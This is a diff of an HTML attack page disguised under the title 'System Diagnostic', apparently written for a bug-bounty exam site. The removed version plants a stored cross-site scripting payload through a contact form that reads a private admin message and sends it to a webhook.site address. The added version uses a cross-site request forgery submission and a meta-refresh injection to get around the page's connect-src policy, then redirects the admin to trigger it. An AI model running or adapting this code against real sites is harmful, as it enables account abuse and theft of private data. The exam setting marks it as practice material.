@@ -1,23 +1,43 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>System Diagnostic</title>
+</head>
 <body>
+    <h1>Exploit Running... Check Webhook.</h1>
     <script>
-       // 1. Submit the message containing the XSS
-fetch('https://api-bugbounty-exam.hashacademy.co/api/contact/submit', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-        "name": "Saja",
-        "email": "research@seoulaura.com",
-        "subject": "Urgent",
-        "message": "<script>fetch('/api/admin/messages/69ea47fabee6d6b7c6645a43').then(r=>r.text()).then(t=>location='https://webhook.site/9223b93d-5801-4d77-a2bd-8d70bfd4ef0c?flag='+btoa(t))<\/script>",
-        "category": "technical",
-        "priority": "high"
-    })
-}).then(r => r.json()).then(data => {
-    // 2. Redirect the admin to the newly created message to trigger the script above
-    location.href = 'https://bugbounty-exam.hashacademy.co/admin/view/' + data.data.id;
-});
+        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
+        const webhook = "https://webhook.site/580abe3d-f0f3-4055-9599-b52cf52f5ff6";
+        
+        // This payload uses a Meta Refresh to bypass connect-src 'self'
+        // It forces the admin's browser to navigate to the private message.
+        const xssMessage = `<meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/api/admin/messages/69ea47fabee6d6b7c6645a43">`;
+
+        async function launch() {
+            // 1. Submit the message via CSRF
+            const response = await fetch(targetApi, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "name": "Saja",
+                    "email": "research@seoulaura.com",
+                    "subject": "Urgent Security Report",
+                    "message": xssMessage,
+                    "category": "technical",
+                    "priority": "high"
+                })
+            });
+
+            // 2. Wait for the server to process, then redirect the admin 
+            // to their own 'sent messages' or 'inbox' to trigger the Meta tag.
+            // If you know the exact inbox URL, use that instead.
+            setTimeout(() => {
+                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
+            }, 1500);
+        }
+
+        launch();
     </script>
 </body>
 </html>
